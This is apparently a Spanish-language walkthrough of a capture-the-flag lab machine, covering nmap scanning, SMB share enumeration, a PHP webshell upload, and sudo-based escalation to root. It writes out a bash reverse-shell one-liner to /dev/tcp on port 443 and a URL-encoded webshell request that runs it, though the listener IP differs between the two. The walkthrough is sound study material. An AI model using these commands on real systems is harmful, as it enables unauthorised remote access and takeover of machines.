
Recomendacion: Antes de ponernos a trabajar debemos crear una carpeta que contenga otros directorios para tener un trabajo más ordenado 

-----------
# *Fase de Reconocimiento:* 
Primero escanearemos nuestra red para poder encontrar la ip de la maquina que intentaremos vulnerar, para eso podemos ocupar nuestro script creado anteriormente: ![[Pasted image 20240813123529.png]]
para verificar podemos ocupar también la busqueda con nmap.
![[Pasted image 20240813123727.png]]
siempre es bueno tener todo ratificado o al menos obtener información de más de una aplicación en caso de algún problema. 
Podemos entender de estos escaneos que la maquina a vulnerar esta en la ip 192.168.1.92.
El siguiente paso es aplicar el reconocimiento con nmap de los puertos esto se hace igual que como enseñe en el video anterior, debemos lanzar en 2 pasos el reconocimiento, el primero es para ver los puertos abiertos y el segun para ver los servicios y las versiones de estos servicios que ocupan los puertos.
```
$ nmap -sS --open --min-rate 5000 -n -Pn -vvv 192.168.1.92 -oG allPorts
```
en este caso podemos ver que estamos agregando el -oG allPorts para poder tener un archivo de salida con los puerto que se vayan encontrando. 
![[Pasted image 20240813125632.png]]
podemos ver en la imagen que tenemos los puertos 22-80-139-445 abiertos por lo que ahora podemos lanzar el reconocimiento de estos puertos con los servicios y versiones.
```
$ nmap -sCV -p22,80,139,445 192.168.1.92 -oN target
```
![[Pasted image 20240813125933.png]]
ahora podemos intentar ver que hay en la pagina web. 
![[Pasted image 20240813130106.png]]
con esto podemos ver que no hay nada raro en la pagina web, por lo que podemos ver si buscando con gobuster podemos llegar a algo o no.
![[Pasted image 20240813130747.png]]
se aplico una busqueda de contenido de web con gobuster, sin encontrar nada interesante.
![[Pasted image 20240813130849.png]]
al aplicarle un --add-slash quizas podriamos encontrar algo pero vemos que no hay nada por lo que desistimos de esta idea, pero tenemos un smb y tambien tenemos un ssh por lo que podemos intentar jugar con eso. 
En este caso partiremos haciendo una enumeración de el servicio SMB, que se realiza con el siguiente comando: 
```
$ smbclient -L /192.168.1.92 -N
```
![[Pasted image 20240813131411.png]]
Con esto podemos hacer el reconocimiento de algunos directorios, por lo ahora necesitamos ver cuales de estos directorios tiene acceso a escritura y lectura de archivos, por lo que eso debemos hacerlos con la aplicación de smbmap de la siguiente manera: 
```
$ smbmap -H /192.168.1.92
```
![[Pasted image 20240813132326.png]]
# *Fase de explotación:*
podemos ver que el directorio server tiene un acceso a lectura y escritura, por lo que ahora podemos entrar en este  mediante smbclient. 

```
$ smbclient //192.168.1.92/server
```
y entramos al directorio. 
![[Pasted image 20240813132505.png]]
cuando nos pida la contraseña no será necesario ingresar nada ya que esta abierto los accesos. 
como tenemos la oportunidad de leer y de escribir archivos dentro de este directorio podemos subir una webshell creandola en un archivo llamado cmd.php.
![[Pasted image 20240813133014.png]]
dentro del smbclient podemos ocupar el comando put para subir un archivo. 
![[Pasted image 20240813133138.png]]
en este caso ocupamos webshell.php
![[Pasted image 20240813135647.png]]
por lo que ahora podemos ver que tenemos una shell en el servidor.
Ahora podemos utilizar un oneliner para poder entrar a la maquina como el usuario www-data. `bash -c "bash -i >& /dev/tcp/192.168.1.89/443 0>&1" // los & se cambian por %26`

```
http://192.168.1.92/webshell.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.1.93/443%200%3E%261%22
```
obteniendo lo siguiente. 
![[Pasted image 20240813141050.png]]
![[Pasted image 20240813141105.png]]
ahora tenemos que hacer el tratamiento de la terminal con los siguientes comandos. 
script /dev/null -c bash
ctrl + z
 stty raw -echo; fg 
reset xterm 
export TERM=xterm 
export SHELL=bash
stty rows 52 columns 248
y quedaria la terminal de la siguiente manera: 
![[Pasted image 20240813141649.png]]
# *Fase de Escalado de privilegios*
Ahora tenemos que pasar a la fase de escalado de privilegios. 
![[Pasted image 20240813141815.png]]
si hacemos un sudo -l podemos ver lo de la imagen anterior, esto nos dice que la bash tiene permisos de correr comandos como el usuario s3cur4, por lo que podemos favorecernos de esto y poder atacar de la siguiente manera: 
![[Pasted image 20240813142122.png]]
con esto ya estamos como el usuario s3cur4, pero ahora necesitamos escalar a el usuario root, para poder tener el control total del acceso a la maquina. 
si nos vamos al home podemos obtener la primera flag del user.txt
![[Pasted image 20240813142307.png]]
si hacemos sudo -l de nuevo podemos ver que apt esta corriendo comandos como super usuario esto puede ser peligroso.
![[Pasted image 20240813142452.png]]
si vamos a la pagina https://gtfobins.github.io/gtfobins/apt/, podemos ver lo siguiente. 
![[Pasted image 20240813142549.png]]
con este one liner podemos obtener acceso al usuario root. 
![[Pasted image 20240813142934.png]]
luego de eso colocamos lo siguiente:
![[Pasted image 20240813143030.png]]
y estamos como usuario root.
![[Pasted image 20240813143059.png]]
ahora solo nos queda obtener la flag del usuario root. 
![[Pasted image 20240813143143.png]]
